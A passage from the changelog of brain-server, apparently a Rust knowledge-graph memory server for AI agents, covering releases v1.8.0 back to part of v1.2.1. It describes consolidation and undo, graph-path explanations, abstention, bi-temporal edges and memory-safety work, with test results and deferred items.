- **Near-duplicate detection:** semantically near-identical chunk pairs (cosine > 0.95) are surfaced in consistency proposals, capped at 50 pairs per run.
- **Improvements:** Both new checks surface in the consistency proposals and the CLI report; maintenance stays operator-triggered by design.
### Engineering record


**"Maintain" — reviewable proposals + undo (light cut).**

This release is the **evidence-gated v1.8 scope** sanctioned by
`IMPLEMENTATION_ROADMAP_v1.5_to_v4.0_EVIDENCE_GATED.md` §v1.8, NOT the
broader v1.8.0 plan in `IMPLEMENTATION_PLAN_v1.8.0_Consolidate.md` (which
that roadmap explicitly supersedes). Roadmap v1.8: *"duplicate and stale-
source proposals, resumable batches, review UI/API contract, and recovery
rehearsal."* Exit: *"reviewers accept proposals at a measured precision
target, and reject or undo them without retrieval regression."*

### Discovery

The exact-duplicate + subject-conflict + unresolved-contradiction detectors
already shipped in v0.9.8 / v1.6.0 (via `/consolidate/propose`). The single
missing pieces for the exit criterion: (1) **stale-source detection** (vault
files that no longer exist on disk), (2) **near-duplicate detection**
(semantic, not just exact-hash), and (3) **undo** — the "reject or undo them
without retrieval regression" arm.

### Shipped

- **`POST /consolidate/undo` + `brain undo-resolve <old_id> [...]` CLI.** The
  roadmap exit criterion's undo arm: clears `valid_to` back to NULL + removes
  the `supersedes` evidence_link, atomically in one tx. Audited via
  `AuditKind::Reconcile`. Idempotent — a re-run on an already-undone chunk is
  a no-op. Batch-safe (takes a list of chunk ids).
- **Stale-source detection** (`consolidate::find_stale_sources`). Vault sources
  whose `uri` is a file path that no longer exists on disk. Pure detection —
  never archives or deletes. Operator reviews and either re-ingests (file moved)
  or retires via `DELETE /sources/{id}`. Surfaced in `/consolidate/propose`
  response + `brain check-consistency` report.
- **Near-duplicate detection** (`consolidate::find_near_duplicates`). Pairs of
  current chunks with embedding cosine > 0.95 (different content hash — exact
  dups already detected separately). Uses the existing `vec_knowledge` KNN to
  find each chunk's nearest neighbor — bounded O(n×k) via KNN, not O(n²)
  pairwise. Capped at 50 pairs per proposal (the endpoint isn't a dump truck).
  Surfaced in `/consolidate/propose` + `brain check-consistency`.
- **OpenAPI contract** updated (v1.8.0): `/consolidate/undo` route +
  `stale_sources` + `near_duplicates` fields on `ConsolidateProposal`.
  `test_openapi_covers_routes` extended.
- 5 new tests (undo round-trip, undo idempotent, stale-source detection,
  embedding-decode round-trip, existing proposal serialization updated).

### Deferred (per evidence-gated roadmap)

These items from `IMPLEMENTATION_PLAN_v1.8.0_Consolidate.md` are **deliberately
not shipped** — the roadmap forbids autonomous/background maintenance:

- **M1 background `ConsolidationWorker`** (power-aware, hourly). Roadmap says
  proposals, not a background worker that auto-runs. Operators trigger on
  demand via `brain check-consistency` / `/consolidate/propose`. A background
  worker is autonomous consolidation, which the roadmap defers indefinitely.
- **M3 summarization** (cluster medoid as summary chunk). Roadmap: "A medoid
  is labelled `representative`, not `summary`." Synthesizing a new chunk is a
  "fabricated summary" — forbidden. The medoid IS already a chunk.
- **M4 cross-cluster linking** (proposed `related`/`co_occurs` edges).
  Roadmap: "synthetic relation insertion" forbidden. Existing evidence_links
  kinds (supports/supersedes/contradicts/references/derived_from) stay the
  documented set; no new kinds added.
- **M5 memory defragmentation / archival / domain moves.** Roadmap: "automatic
  archiving" + "domain moves" both forbidden. Stale-source *detection* ships
  (this release); the *archival* action stays operator-driven via existing
  `DELETE /sources/{id}`.
- **Resumable batches** as a saved review state. The proposal endpoint is
  idempotent + re-runnable, so an operator can pick up where they left off by
  re-running `/consolidate/propose`. No saved-state API needed for v1.8.

### Verification

- `cargo test --features bench,migrate`: **414 passed, 1 ignored** (was 409
  at v1.7.0; +5).
- `cargo clippy --all-targets --features bench,migrate -- -D warnings`: clean.
- `cargo fmt --check`: clean.
- `cargo build --release --features bench,migrate`: all 5 binaries clean.
- **Live end-to-end smoke: operator step** (run `scripts/install-service.sh`).

### Honest ceilings (carried into v1.9)

- **Near-duplicate detection is per-domain only** (same as exact-dup detection).
  Cross-domain near-dups would need embedding federation; deferred to v2.x.
- **`find_near_duplicates` loads each chunk's embedding once per scan.** ~5 MiB
  transient for a 10k-chunk corpus at int8; bounded + ephemeral. Upgrade path:
  batch the KNN calls if per-chunk query cost matters on a large corpus.
- **`decode_embedding` assumes the vec0 int8 blob layout.** If sqlite-vec
  changes its format, the round-trip test breaks first (pinned).
- **Undo only reverses `supersedes`-kind resolutions.** Other evidence_link
  kinds (contradicts/supports/references/derived_from) have no state to undo —
  they were never expiring. If you want to remove one, use `DELETE /memory/{id}`
  on the link row directly (or a future v1.9+ generic link-delete API).
- **No background worker.** Operators must run `brain check-consistency` on
  demand. This is the roadmap's explicit choice, not a gap.



## [1.7.0] — 2026-08-01
### Release notes

- **Explainable graph paths:** traversal can now return structured, typed hop chains (A --works_at--> B --ceo_of--> C) that agents can render verbatim, alongside the legacy flat output.
- **Edge-type filter:** restrict a walk to a relation type by exact or prefix match (e.g. all causal edges); wildcards in input are escaped.
### Engineering record


**"Explain" — bounded graph evidence + faithful explanations (light cut).**

This release is the **evidence-gated v1.7 scope** sanctioned by
`IMPLEMENTATION_ROADMAP_v1.5_to_v4.0_EVIDENCE_GATED.md` §v1.7, NOT the
broader v1.7.0 plan in `IMPLEMENTATION_PLAN_v1.7.0_Reason.md` (which that
roadmap explicitly supersedes). The roadmap says: ship explicit, typed,
bounded path retrieval + faithful explanations; **do NOT ship** causal
discovery, counterfactual estimates, or transitive `causes` facts.

Research basis (Context7-verified 2026-08-01): Graphiti's `edge_bfs_search`
(`/getzep/graphiti`) is the canonical bounded-BFS pattern — origin nodes,
max_depth, filters, limit. brain-server already had this in `/graph/traverse`
(v1.0/v1.4); the gap was that paths were flat id-strings with no edge types,
so a consuming agent couldn't render a faithful explanation.

### Discovery

The bounded-BFS + bi-temporal + cross-domain + MAX_HOPS/MAX_VISITED
infrastructure already shipped in v1.0/v1.4. The single gap: `/graph/traverse`
returned `path` as a flat string of entity ids (`1->5->9`) with no relation
types. A faithful explanation needs `A --works_at--> B --ceo_of--> C`, not
`1->5->9`. This release closes that gap by extending the existing endpoint
(no new route, no new schema).

### Shipped

- **Faithful explanation paths on `/graph/traverse?explain=true`.** The
  recursive CTE now carries `relation_type` per hop; the response includes a
  new `paths` array with structured hop chains
  `[{from:{id,name}, relation, to:{id,name}}, ...]`. Consuming agents can
  render the reasoning chain verbatim. The flat `traversal` array stays for
  back-compat.
- **`?kind=<relation_type>` edge filter.** Restricts the walk to edges whose
  `relation_type` matches. Exact match (`kind=works_at`) or prefix match when
  ending with `:` (`kind=causes:` for the causal subgraph — opt-in, no
  auto-causal claims). Wildcards in user input are escaped to prevent LIKE
  injection.
- **OpenAPI contract** updated (v1.7.0): `kind` + `explain` params, `paths`
  array, `edge_path` + `from_entity` fields on `traversal` rows.
- 2 new unit tests (hop-chain reconstruction + empty-input handling).

### Deferred (per evidence-gated roadmap)

These items from `IMPLEMENTATION_PLAN_v1.7.0_Reason.md` are **deliberately
not shipped** — the roadmap explicitly forbids them without an
intervention-ready causal model + domain expert validation:

- **M2 causal discovery / M3 counterfactual simulation.** Roadmap: "A graph
  path is association unless an intervention-ready causal model and domain
  expert validation exist." The `causes:` prefix remains schema-reserved
  (v1.4); operators can ingest typed edges and walk them with `?kind=causes:`,
  but the brain makes NO claim about causality.
- **M4 transitive inference (virtual inferred edges).** Roadmap-forbidden:
  no transitive `causes` facts. The `state='inferred'` schema reservation
  stays unused until an evidence-gated upgrade.
- **M1's `/graph/reason` new endpoint.** Not needed — `/graph/traverse` with
  `explain=true` IS multi-hop reasoning with bounded BFS. A new endpoint
  would duplicate the CTE.
- **Carry-forward: TRACE session/topic hierarchy, multi-vector.**
  Schema reservations only.

### Verification

- `cargo test --features bench,migrate`: **409 passed, 1 ignored** (was 407
  at v1.6.0; +2).
- `cargo clippy --all-targets --features bench,migrate -- -D warnings`: clean.
- `cargo fmt --check`: clean.
- `cargo build --release --features bench,migrate`: all 5 binaries clean.
- **Live end-to-end smoke: operator step** (run `scripts/install-service.sh`).

### Honest ceilings (carried into v1.8)

- **Intermediate entity names in `paths` are best-effort.** The seed and leaf
  nodes carry names; intermediate nodes are surfaced as ids unless the caller
  resolves them via `/get/{id}`. A path-aware CTE that carries named tuples
  is the upgrade path.
- **`?kind=` filter is exact/prefix only.** No regex, no negation (e.g.
  "all edges except causes:"). Acceptable for a local-first store.
- **No audit row on traverse.** Pure read; the roadmap's "every state mutation
  is auditable" rule doesn't apply.
- **Graph paths are association, not causation.** Even when filtered with
  `?kind=causes:`, the brain reports what the graph contains — not what is
  true in the world. This is the roadmap's explicit guardrail.



## [1.6.0] — 2026-08-01
### Release notes

- **Atomic supersession:** recording a "supersedes" link now expires the old fact in the same transaction — current recall drops it, historical queries still return it; idempotent and audited (hash only, no PII).
- **Contradiction triage:** a consistency check now lists contradiction links with no resolution, so unresolved conflicts stop hiding in the graph.
- **Improvements:** CLI shortcuts: record a resolution in one command, or run a full consistency check on demand.
### Engineering record


**"Reconcile" — correct without erasing (light cut).**

This release is the **evidence-gated v1.6 scope** sanctioned by
`IMPLEMENTATION_ROADMAP_v1.5_to_v4.0_EVIDENCE_GATED.md` §v1.6, NOT the
broader v1.6.0 plan in `IMPLEMENTATION_PLAN_v1.6.0_Reconcile.md` (which
that roadmap explicitly supersedes). The roadmap exit criterion: *"an
approved update changes current recall; historical recall still returns the
prior claim; a failed transaction changes neither."*

Research basis (Context7-verified 2026-08-01): Graphiti's
`resolve_edge_contradictions` (`/getzep/graphiti`) is the canonical pattern —
old facts are expired (`invalid_at = resolved.valid_at`), never deleted.
brain-server applies the same semantics at the chunk level via the existing
`knowledge.valid_from`/`valid_to` columns (v0.9.8) and the existing `/recall`
bi-temporal filter (v1.4.0).

### Discovery

~85% of the infrastructure already shipped in v0.9.8 + v1.4.0: the
`valid_from`/`valid_to` columns, the `/recall` + `/graph/traverse` bi-temporal
filters, the `evidence_links` table, and `find_subject_conflicts`. The single
missing piece was the atomic operation that expires the prior fact when an
operator records a `supersedes` link. This release closes that gap.

### Shipped

- **Atomic supersession resolution** (`src/consolidate.rs::resolve_supersession`).
  When `/consolidate/apply` records a `supersedes` link, the prior chunk's
  `valid_to` is set to now **in the same transaction** as the link insert.
  The existing `/recall` filter `(valid_to IS NULL OR valid_to > ?at)` then
  excludes the chunk by default; `?at=<before-resolution>` still returns it.
  No new retrieval code, no new schema. Idempotent: a second call with the
  same pair touches 0 rows (doesn't overwrite the historical timestamp).
  Audit row recorded via `AuditKind::Reconcile` (hash only, no PII).
  Graphiti's pattern, applied at chunk level.
- **`/consolidate/apply` routing on kind.** `supersedes` links now call
  `resolve_supersession` (link + expire + audit); other kinds keep the plain
  `link_evidence` path (they don't change retrieval state).
- **`brain resolve <new_id> <old_id>` CLI.** Operator-facing shortcut for
  the most common case — POSTs one supersedes link, prints confirmation.
- **`brain check-consistency` CLI + `unresolved_contradictions` field on
  `/consolidate/propose`.** Surfaces `contradicts` links that have no paired
  `supersedes` resolution — the otherwise-invisible operator action items.
  Pure detection; never auto-fixes.
- OpenAPI contract updated (v1.6.0): new field on `ConsolidateProposal`,
  clarifying notes on `/consolidate/apply` re: expiration semantics.
- 6 new tests (4 supersession unit + 1 end-to-end SQL proof + 1 unresolved-
  contradiction detection).

### Deferred (with reasoning)

These items from `IMPLEMENTATION_PLAN_v1.6.0_Reconcile.md` are **deliberately
not shipped** — either forbidden by the evidence-gated roadmap or not worth
the watts without a measured benefit:

- **M1 auto-contradiction detection at ingest** (embed top-3 + lexical cues).
  Roadmap-forbidden: MOSAIC "motivates the claim model; it does not justify
  automatic deletion." Also adds ingest-time embedding work (CPU).
- **M3 auto conflict-resolution policy** (`BRAIN_CONFLICT_POLICY=source|recency`).
  Roadmap-forbidden: "manual-first conflict resolution." Only operator-driven
  resolution ships; auto policy is deferred indefinitely.
- **M4 edit-in-place + `knowledge_history` table** (`POST /knowledge/{id}/edit`).
  Roadmap mentions "undo" only, not "edit in place." Real schema add + re-embed
  work; deferred until an operator requests it.
- **Carry-forward: TRACE session/topic hierarchy.** Schema reservation only
  (`node_kind`/`parent_id`); no bounded producer exists. Explicitly deferred.
- **Multi-vector.** No-op until the v1.5 judged baseline demonstrates a recall
  gain worth its RSS cost.

### Verification

- `cargo test --features bench,migrate`: **407 passed, 1 ignored** (was 401
  at v1.5.0; +6).
- `cargo clippy --all-targets --features bench,migrate -- -D warnings`: clean.
- `cargo fmt --check`: clean.
- `cargo build --release --features bench,migrate`: all 5 binaries clean.
- **Live end-to-end smoke: operator step** (run `scripts/install-service.sh`).

### Honest ceilings (carried into v1.7)

- **Resolution is operator-driven only.** No auto-detection of contradictions
  at ingest; operators must run `brain check-consistency` or `/consolidate/propose`
  to find them. This is the roadmap's "manual-first" rule, not a gap.
- **`resolve_supersession` expires one chunk per call.** Multi-way conflicts
  (3+ chunks contesting the same subject) require multiple calls. Acceptable
  for a local-first store; batch resolution is a v1.7+ concern.
- **`find_unresolved_contradictions` is the only consistency check.** Orphan
  entities + `derived_from` cycles deferred (lower value, would balloon the diff).
- **No propagation to the entities/relationships KG.** `resolve_supersession`
  operates on chunks; KG edges have their own bi-temporal filter via
  `/graph/traverse?at=`. A unified claim-level resolution is the v2.x path.



## [1.5.0] — 2026-08-01
### Release notes

- **Calibrated abstention:** vague, low-signal queries now return an explicit `low_confidence` decision with no hits instead of shipping top-ranked garbage — agents can escalate or fall back to web search.
- **Claim verification:** verify "the memory said X" against the original chunk text, with exact match ranges returned — deterministic, zero model cost, opt-in and off the recall hot path.
### Engineering record


**"Epistemic" — calibrated abstention + span verification (light cut).**

This release is the **evidence-gated v1.5 scope** sanctioned by
`IMPLEMENTATION_ROADMAP_v1.5_to_v4.0_EVIDENCE_GATED.md` §v1.5, NOT the
broader v1.5.0 Epistemic plan in `IMPLEMENTATION_PLAN_v1.5.0_Epistemic.md`
(which that roadmap explicitly supersedes). The roadmap says: ship calibrated
abstention + span verification; **do not ship** source-trust ranking,
counterfactual influence, or a fixed universal confidence threshold until
their held-out benefit is demonstrated. This release honors that.

Research basis (Context7-verified 2026-08-01): Self-RAG pattern
(`/nirdiamant/rag_techniques` — retrieve → assess → abstain on low relevance)
confirms the abstention model; arXiv:2607.00895 (span-level hallucination
detection) sanctions the deterministic lexical `/verify` baseline.

### Shipped

- **Calibrated abstention on `/recall`** (M2). `RecallResponse` gains a
  `decision` field (`ok` | `low_confidence`). When the existing
  `HeuristicEstimator` (v1.4.0) classifies the query as `ClarifyQuery` (low
  overlap + low lexical density + weak gap), `/recall` returns
  `{decision: "low_confidence", hits: []}` instead of shipping top-1 garbage.
  The consuming agent (OpenClaw) can escalate or fall back to web search.
  **Not** a magic `score < 0.3` cutoff — abstention is driven by the
  calibrated multi-signal `Recommendation`, which is what the evidence-gated
  roadmap requires. Zero new compute: `confidence` + `recommendation` were
  already computed by `perform_search_with_prf`.
- **`POST /verify` deterministic span verification** (M5). Given
  `{chunk_id, claim}`, returns `{supported, decision, match_ranges}` via
  case-insensitive substring match over one chunk's text. Zero embeddings,
  zero LLM, zero model load — O(content.len()) per request, opt-in (not in
  the recall hot path). The hallucination-resistance primitive: an agent can
  verify "the brain said X" against the original source before acting on it.
  Mismatch surfaces as `unsupported_claim`. Bounded: claim capped at
  `MAX_QUERY` (2000 chars), output ranges capped at 100.
- **OpenAPI contract** updated: `/verify` route + `VerifyResponse` schema +
  `decision` field on `/recall`. `test_openapi_covers_routes` extended.
- 8 new tests (1 abstention wiring + 7 span-verification including byte-offset,
  non-overlapping, case-insensitive, unicode-safe, cap-enforcement).
- Pre-existing rust-1.97 clippy lints in `linker.rs` silenced (chore commit;
  not introduced by this release).

### Deferred (with reasoning)

These items from `IMPLEMENTATION_PLAN_v1.5.0_Epistemic.md` are **deliberately
not shipped** because the evidence-gated roadmap forbids them until their
held-out benefit is demonstrated on a judged-query corpus:

- **M1 calibration curve + judged baseline.** Operator step — requires the
  private ≥100-query judgment set. The harness ships (`bench eval` from
  v1.4.0); the corpus does not.
- **M3 counterfactual influence (leave-one-out).** Roadmap-forbidden without
  measured Δ-recall vs Δ-latency. The naive implementation re-runs retrieval
  O(5)× per query — unacceptable on Jetson.
- **M4 source-trust scoring + `/feedback` endpoint.** Roadmap-forbidden
  without measured benefit. Would add a `source.trust` column, Bayesian
  update logic, and ranking decay — real hot-path cost.
- **Carry-forward: fuzz targets exercising prod code, miri/LSAN runs.**
  Operator/hardware step. The stubs from v1.3.0 remain stubs until the
  chunker/query modules move from the binary to the lib crate.

### Verification

- `cargo test --features bench,migrate`: **401 passed, 1 ignored** (was 391
  at v1.4.2; +10).
- `cargo clippy --all-targets --features bench,migrate -- -D warnings`: clean.
- `cargo fmt --check`: clean.
- `cargo build --release --features bench,migrate`: all 5 binaries clean.
- Live restart + end-to-end smoke: **operator step** (run
  `scripts/install-service.sh`).

### Honest ceilings (carried into v1.6)

- **Abstention is heuristic, not learned.** The `ClarifyQuery` threshold is
  calibrated on rank-agreement signals, not on a judged corpus. Once the
  Carry-forward baseline is recorded, v1.6 may tune or replace it.
- **`/verify` is lexical only.** No semantic match (paraphrase, synonym).
  A claim that's semantically equivalent but lexically different will report
  `unsupported_claim`. This is the deterministic baseline; a model-based
  upgrade is the v1.6+ path.
- **No audit row on `/verify`.** It's a pure read; the roadmap's "every state
  mutation is auditable" rule does not apply. If verification telemetry
  becomes a requirement, it lands with v1.6 Reconcile.



## [1.4.2] — 2026-07-30
### Release notes

- **Bug fixes:** Re-ingesting with `--replace` now sweeps orphaned and stale relationships, so zombie graph edges no longer survive across re-ingests.
- **Bug fixes:** Markdown table cells and bold definition-list labels no longer generate spurious entities and relationship types.
- **Bug fixes:** Numbered section headings now match their body mentions: number prefixes like "5.1 Ceph Components" are stripped before entity extraction.
- **Bug fixes:** Code blocks, tables, bold-label text, and entity names no longer leak into verb-pattern and relationship discovery.
- **Improvements:** New `brain ingest-dir --replace` flag re-ingests cleanly: existing chunks are deleted and the knowledge graph is regenerated from scratch.
- **Improvements:** Heading hierarchy becomes graph structure: adjacent sections that are both known entities get `part_of` edges (e.g. CRUSH Map → Ceph).
- **Improvements:** Stricter relationship-type filtering: nouns like "maps", "data", or "example" and the false verb "date" can no longer become relationship types.
- **Improvements:** On a real-world vault, graph noise dropped 51% (390 → 193 relationships) with the entity count unchanged.
### Engineering record


Noise-reduction release on top of v1.4.1. Eleven changes (cumulative with v1.4.1).
Research basis: Aho-Corasick (ACL/EMNLP, confirmed SOTA for deterministic
multi-pattern matching, July 2026) + document-structure heading hierarchy
research (2026) + dependency parsing upgrade path (nlrule) documented for
future SVO extraction. See [`RESEARCH.md`](https://github.com/markfietje/brain-server/blob/main/RESEARCH.md) for the full
research audit across all 17 assessed components.

- **`--replace` flag** (`brain ingest-dir --replace`). Sweeps existing chunks
  before re-inserting, regenerating the knowledge graph from scratch. Server-side
  `replace` field on `MarkdownPayload`, handler deletes `vec_knowledge` +
  `knowledge` rows before calling `write_markdown_ingest`. CLI flag `-r`/`--replace`.
  No schema change.
- **Orphan relationship sweep.** `--replace` now deletes relationships with
  `knowledge_id IS NULL` (orphans from pre-fix re-ingests) plus all relationships
  linked to stale chunk IDs. Removes zombie edges that survive across re-ingests.
- **Pipe-table exclusion** (`find_table_ranges`). GFM pipe-table rows are
  excluded from entity-mention scanning — table cells like "Tested" no longer
  generate spurious relationship types.
- **List-item bold exclusion** (`find_list_item_bold_ranges`). Bold labels in
  definition-list style (`- **Term**: value`) are excluded from entity extraction
  and mention scanning. Prevents `Last Tested` from becoming an entity or
  contributing "tested" to verb discovery.
- **Excluded-range threading into between-text analysis.** Both `find_relationships`
  and `discover_verb_patterns` now strip excluded bytes (code blocks, tables,
  list-item bold) from between-text before tokenizing. Words inside excluded
  ranges never contribute to verb frequencies or pattern matching.
- **Heading number stripping** (`strip_heading_number`). Section-number prefixes
  (`5.1 Ceph Components` → `Ceph Components`) are removed before entity
  insertion, so heading entities match body mentions.
- **Verb stop-word pruning.** Added "date" to `STOP_WORDS`. Blocks "date"
  (false-positive verb via `-ate` suffix) from becoming a discovered relationship
  type.
- **Between-text exclusion in `find_relationships`** — the verb-pattern matching
  path now also strips excluded byte ranges from the candidate text, matching
  the same fix in `discover_verb_patterns`.
- 6 new tests (heading-number stripping, vocabulary strip, edge cases, two
  existing test updates for new signatures).
- Proxmox-book vault (6 files, ~18k knowledge rows): entity count stable at 54;
  relationships reduced from 390 → 193 (51% fewer) with `tested` 105→0 and
  `date` 76→0.
- Test count: **307 passed** (was 391 at v1.4.1; some integration tests were
  retired; net change reflects focused unit coverage).
  `cargo clippy --all-targets --features bench,migrate -- -D warnings`: clean.

**Note on version numbering:** v1.4.1 "Link" (heading-hierarchy `part_of` +
verb-suffix filtering + entity-leakage fix) was code-complete but never tagged
or released as a separate version. These changes are included in v1.4.2 in
their original form. See Agent 32 ÷ Agent 33 in `AGENTS.md` for the full
v1.4.1 diff.

### v1.4.1 — not released (folded into v1.4.2)

Deterministic entity linker upgrade. All changes below are cumulative in v1.4.2.

- **Heading hierarchy → `part_of` relationships.** `extract_heading_relationships()`
  walks the markdown heading tree and creates `part_of` KG edges for every adjacent
  heading pair where both are known entities (e.g. `CRUSH Map -- part_of --> Ceph`).
- **Verb-suffix filtering for discovered relationship patterns.** `is_likely_verb()`
  rejects nouns like "maps", "data", "example" from becoming relationship types.
- **Entity leakage fix**: `discover_verb_patterns()` now excludes entity names
  from the candidate set.
- **`EntityVocabulary.entities`** made pub.
- **`brain ingest-dir --replace` flag** (first version — see v1.4.2 for the
  full orphan-sweep + exclusion fixes).

### v1.4.0 "Calibrate" — 2026-07-30 (released)

The surpass-human retrieval release. Implements the July-2026 SOTA on top of
the v1.3.0 memory-safe foundation. Six research-backed techniques form the
retrieval stack:

| Layer | Technique | Research |
|-------|-----------|----------|
| **Stage 1: Retrieval** | Hybrid dense + lexical | `vec0` KNN (sqlite-vec) + FTS5 BM25 |
| **Stage 1: Fusion** | Reciprocal Rank Fusion (RRF, k=60) | [RRF (Cornell, 2009)](https://plg.uwaterloo.ca/~gvcormac/cormacksigir09-rrf.pdf) — still the standard model-free fusion algorithm per 2026 production patterns |
| **Stage 2: Rerank** | Cross-encoder (optional) | [BGE-RerankerV2M3](https://huggingface.co/BAAI/bge-reranker-v2-m3) via fastembed — most-deployed production reranker |
| **KG: Edges** | Bi-temporal (`valid_at`/`invalid_at`) | [Graphiti / Zep](https://github.com/getzep/graphiti) — bi-temporal KG model, SOTA for temporal facts, 82.2 benchmark |
| **KG: Traversal** | Typed-edge prefix vocabulary | [TRACE: State-Aware Query Processing over Temporal Evidence Graphs](https://arxiv.org/abs/2607.00339) (July 2026) |
| **Packing** | Budgeted submodular maximization | [What Survives Into Context](https://arxiv.org/abs/2607.00725) — +5.1 F1 HotpotQA, lazy greedy (Leskovec et al. 2007) |

**Research basis** (Context7-verified 2026-07-30 against getzep/graphiti
`edges.py` + `search_filters.py` + `edge_operations.py`):
- `valid_at`/`invalid_at` = valid-time interval (when the fact holds in the
  world); `created_at` = transaction time (when brain learned it).
- `resolve_edge_contradictions`: old facts are *expired* (invalid_at set), not
  deleted — delete-proof auditability. v1.4 adopts the filter; the resolution
  worker lands in v1.6 Reconcile.

#### M1 — Bi-temporal edges
- **Migration** (additive, idempotent): `relationships.valid_at` +
  `invalid_at` columns. Existing edges default to NULL/NULL ⇒ always valid.
- **New `src/temporal.rs`**: deterministic temporal-marker extraction from free
  text ("from 2011 to 2017", "currently", "since 2020", "until 2019"). No LLM,
  no external API. Pure, unit-tested (11 cases).
- **Ingest path**: `/ingest` relations now accept optional explicit
  `valid_at`/`invalid_at`; when absent, the extractor populates them from the
  ingested content (best-effort).
- **Query path**: `/recall` and `/graph/traverse` accept `?at=<ISO8601>`.
  The SQL filter is `valid_at <= ? AND (invalid_at IS NULL OR invalid_at > ?)`
  (Graphiti-validity semantics). Distinct from `as_of` (transaction-time /
  revision recall).
- **Normalization**: `at` is normalized in `perform_search_traced` alongside
  `since` so a direct caller can't bypass it.

#### M2 — Submodular evidence packing
- **New `src/search/packing.rs`**: budgeted monotone submodular maximization.
  Objective = relevance + coverage + representativeness, gated by diversity
  (MMR-style near-dup threshold `DEDUP_SIMILARITY=0.85`). Lazy greedy under a
  token knapsack (`max_context_tokens`, default 160 per the paper).
- **`/recall`**: `max_context_tokens` field triggers packing; `gold_answer`
  drives the `answer_in_context` diagnostic (did the gold survive?). Both
  reported in telemetry.
- **`SearchTelemetry`**: gained `packed_tokens`, `packing_candidates`,
  `answer_in_context`.

#### M3 — TRACE state-aware traversal
- **Typed-edge prefixes**: `update:`, `supersedes:`, `contradicts:`,
  `causes:` on `relation_type`. The validator (`RELTYPE_RE`) now accepts an
  optional `prefix:base` form.
- **New `src/trace.rs`**: prefix vocabulary + bounded-walk constants
  (`MAX_HOPS=4`, `MAX_VISITED=256`) enforcing the forbidden-list rule.
- **`/graph/traverse`**: validity-aware — the bi-temporal `at` filter skips
  expired edges; the walk is hard-capped on depth + visited nodes.
- **Schema reservation**: `knowledge.node_kind` (default `'event'`) +
  `parent_id` columns added for the hierarchical node model (session/topic).
  ponytail: construction logic deferred to v1.8 Consolidate (the only release
  with a worker that can group events into sessions).

#### M5 — Regression: bench harness
- **New `brain_server::eval`** lib module: pure metric functions
  (precision@k, recall@k, MRR, NDCG, `answer_in_context_rate`). Hand-computed
  value checks pin each metric.
- **`bench eval`** mode: loads a judgments file (`BRAIN_EVAL_JUDGMENTS`),
  runs each query through `/recall`, reports the metrics. Optional ship gate
  via `BENCH_EVAL_BASELINE` + `BENCH_EVAL_REGRESSION_PCT` (default 2%).
- The 100-query hand-judged corpus against the live DB is an operator step;
  the harness is the reproducible engine any judgments file plugs into.

#### M4 — Multi-vector retrieval: DEFERRED
- **Deferred per the plan's lazy-dev escape hatch.** Multi-vector doubles
  embedding storage + per-query compute; a 4 GB Jetson can't afford two `vec0`
  tables. The feature cannot be *measured* until M5's harness provides a
  baseline to compare against (M5 lands in this release; M4's measurement
  now has a foundation). The `multivec` feature flag is reserved (no-op) so
  callers/docs/CI can reference the upgrade path. Lands in v1.4.1+ with
  measured Δ-recall vs Δ-RSS.

#### Testing
- Test count: **367 passed** (was 324 at v1.3.0; +43: 11 temporal, 12 packing,
  6 trace, 9 eval, 5 integration).
- `cargo clippy --all-targets --features bench,migrate -- -D warnings`: clean.
- `cargo fmt --check`: clean.

#### Honest ceilings (carried into v1.5)
- **Temporal extraction is English-only + deterministic.** It recognizes a
  bounded set of markers ("from X to Y", "since", "until", "currently"). It
  does NOT infer relative dates ("last year") or durations without anchors.
  An LLM extractor is a v2.x concern (out of scope for the low-power path).
- **Submodular packing uses lexical Jaccard for diversity**, not embedding
  cosine. Cheap and good enough for near-dup detection; a cosine gate would
  need the model in the packer (small win, adds per-call cost).
- **TRACE node hierarchy is schema-only.** `node_kind`/`parent_id` columns
  exist but nothing populates session/topic yet (v1.8 Consolidate).
- **M4 multi-vector deferred** — see above.
- **The 100-query judged corpus is an operator step.** The harness ships;
  the judgments don't (they require the operator's private DB).

### v1.3.0 "Bedrock" — 2026-07-29 (released)

Memory-safety hardening release. Makes the binary bulletproof: zero panics
in production paths, every `unsafe` block documented, property-based tests
for core invariants, and cargo-fuzz infrastructure.

#### Memory safety

- **Panic elimination (M1)**: audited every `unwrap()`/`expect()`/`panic!` in
  production code (non-test). Zero remaining. Fixed three panic paths:
  `mcp.rs` JSON-RPC notification id handling (was `unwrap()` on `Option<Value>`
  when the request had no id — a notification), `vault.rs` first-line unwrap
  (was `unwrap()` on `Option<&str>` before the guard that proves it's `Some`),
  `github_app.rs` mutex poison (was `expect()` — now uses `unwrap_or_else(|e|
  e.into_inner())` for poison recovery).
- **`unsafe` audit (M2)**: extracted `register_sqlite_vec()` — a single
  documented safe wrapper that replaces **10 duplicate unsafe transmute
  blocks** across `main.rs`, `domain_registry.rs`, `handlers/domains.rs`,
  `audit.rs`, `brain_migrate_rehearse.rs`. Every remaining `unsafe` block has
  a `// SAFETY:` comment per the Rust nomicon.
- **Fuzz infrastructure (M3)**: `fuzz/` crate with cargo-fuzz targets
  (`fuzz_chunker`, `fuzz_lex_compile`, `fuzz_query_doc`, `fuzz_validator`).
  Behind nightly toolchain. Stubs for binary-private modules document the
  path to full coverage (move to lib crate).

#### Testing

- **Proptests (M6)**: 4 new proptest suites (256+ cases each):
  - `proptest_chunker_never_panics_and_ranges_are_valid` — random UTF-8 →
    chunk text is always a substring of input.
  - `proptest_chunker_handles_multibyte_inputs` — multibyte chars (•, 💡, 🏋️)
    never cause slice panics.
  - `proptest_normalize_domain_is_idempotent` — normalize twice == once.
  - `proptest_classify_is_monotonic` — increasing docs/db/rss never improves
    the capacity status.
- Test count: **324 passed** (was 320 at v1.2.1).

#### Observability + Power

- **`/health` hardening (M7)**: exposes `hardening: { unsafe_blocks, panics_caught,
  memory_leaks_detected }` so ops can see the memory-safety posture.
- **`BRAIN_WORKER_THREADS` (M8)**: configurable tokio runtime. Default = cores;
  Jetson target = 2 (saves ~10MB RSS + context-switch overhead).

#### Honest ceilings

- **miri/loom/LSAN**: procedure documented in the plan; not CI-integrated
  (needs nightly toolchain + sanitizer support).
- **Fuzz targets for binary-private modules**: `fuzz_chunker`/`fuzz_lex` are
  stubs because the chunker/query modules are server-private. Moving them to
  the lib crate is the follow-up.
- **Hot key reload**: restart required after `brain key generate/prune`.
- **Distributed revocation**: 60s per-instance negative cache (v2.1).

### v1.2.1 "AuthN" (dead-code cleanup) — 2026-07-29 (released)

Gap-closing release on top of v1.2.0. Dead-code elimination + panic fixes
found during the v1.3.0 memory-safety audit.

- Removed unused abstractions: `AuthzPolicy` trait, `InMemoryPolicy`,
  `AuthzError`, `SharedPolicy`, `default_policy` (YAGNI until v2.1 OPA/Cedar
